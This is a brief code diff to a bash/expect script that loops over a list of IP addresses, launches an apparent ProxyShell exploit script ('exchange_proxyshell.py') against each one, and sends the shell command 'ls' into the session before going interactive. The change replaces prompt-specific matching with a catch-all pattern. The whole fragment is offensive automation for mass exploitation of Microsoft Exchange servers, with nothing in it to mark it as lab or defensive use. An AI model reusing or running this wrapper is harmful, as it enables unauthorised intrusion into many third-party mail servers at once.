@@ -26,15 +26,7 @@ while IFS= read -r ip; do
     (
         output=$(expect -c "
             spawn python3 exchange_proxyshell.py -u https://$ip
-            expect {
-                \"*Please enter your email*\" {
-                    send \"ls\n\"
-                    exp_continue
-                }
-                \"Connection reset by peer\" {
-                    exit 1
-                }
-            }
+            expect -re \".*\" { send \"ls\n\" }
             interact
         " 2>&1)
         
